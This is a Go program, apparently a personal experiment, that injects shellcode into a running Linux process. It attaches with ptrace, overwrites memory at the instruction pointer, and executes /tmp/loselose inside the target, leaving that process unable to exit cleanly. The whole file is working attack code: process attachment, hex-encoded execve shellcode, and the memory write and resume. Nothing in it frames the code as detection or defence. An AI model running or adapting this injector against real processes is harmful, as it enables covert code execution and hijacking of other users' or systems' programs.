// Attempted shell injection using ptrace
// Needs sudo permissions

package main

import (
	"fmt"
	"os"
	"syscall"
)

var shellcodeString string = "\x90\x90\xeb\x12\x48\x31\xc0\x48" +
							 "\x31\xff\x48\x31\xf6\x48\x31\xd2" + 
							 "\x5f\x6a\x3b\x58\x0f\x05\xe8\xe9" + 
							 "\xff\xff\xff\x2f\x74\x6d\x70\x2f" + 
							 "\x6c\x6f\x73\x65\x6c\x6f\x73\x65" +  
							 "\x00\x00\x00"
var NOP string = "\x90"

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

func ptraceWait(process *os.Process) {
	fmt.Printf("Waiting for process to stop\n")
	for {
		pState, err := process.Wait()
		checkError(err)
		var pStatus syscall.WaitStatus = pState.Sys().(syscall.WaitStatus)
		if(pStatus.Stopped()) {
			fmt.Printf("Process Stop successful: %v\n", pState.String())
			break
		} else {
			fmt.Printf("Process state is: %v\nUnsuccessful, trying again", pState.String())
		}
	}
}

func launchInjection(PID int) {

	// create byte array adjusted for size
	shellcodeLen := len(shellcodeString) + (8 - (len(shellcodeString) % 8))
	var shellcodeSlice []byte
	for i := range shellcodeLen {
		if i < len(shellcodeString) {
			shellcodeSlice = append(shellcodeSlice, byte(shellcodeString[i]))
		} else{
			shellcodeSlice = append(shellcodeSlice, byte(NOP[0]))
		}
	}

	fmt.Printf("normal size = %v\t adjusted size = %v\n", len(shellcodeString), len(shellcodeSlice))
	// attach to process
	fmt.Printf("Injecting into process %v\n", PID)
	process, err := os.FindProcess(PID)
	checkError(err)
	err = syscall.PtraceAttach(PID)
	checkError(err)
	fmt.Printf("successfully attached to %v\n", PID)

	// wait for ptrace state to enact
    ptraceWait(process)
    fmt.Printf("Running the syscall PTRACE\n")
    err = syscall.PtraceSyscall(PID, 0)
    checkError(err)

	// I don't know why, but if you don't re-initialize the process the injection will fail... sometimes.
	process, err = os.FindProcess(PID)
	checkError(err)
    ptraceWait(process)


	// retrieve register information
	fmt.Printf("Retrieving register information\n")
	var processRegisters syscall.PtraceRegs
	err = syscall.PtraceGetRegs(PID, &processRegisters)
	checkError(err)
	fmt.Printf("Registry retrieval susccessful, RIP is at %v\n", processRegisters.Rip)

	// write shellcode to process memory
	fmt.Printf("Attempting to write shellcode into %v's memory\n", PID)
	count, err := syscall.PtracePokeData(PID, uintptr(processRegisters.Rip), shellcodeSlice)
	checkError(err)
	fmt.Printf("Wrote %v bytes to process memory\n", count)

	// Continue after write
	fmt.Printf("Attempting to continue after memeory write\n")
	err = syscall.PtraceCont(PID, 0)
	checkError(err)
	
	fmt.Printf("Successful injection, running /tmp/loselose within PID %v.\n", PID)
	fmt.Printf("Note, PID %v can no longer exit gracefully.\n", PID)
}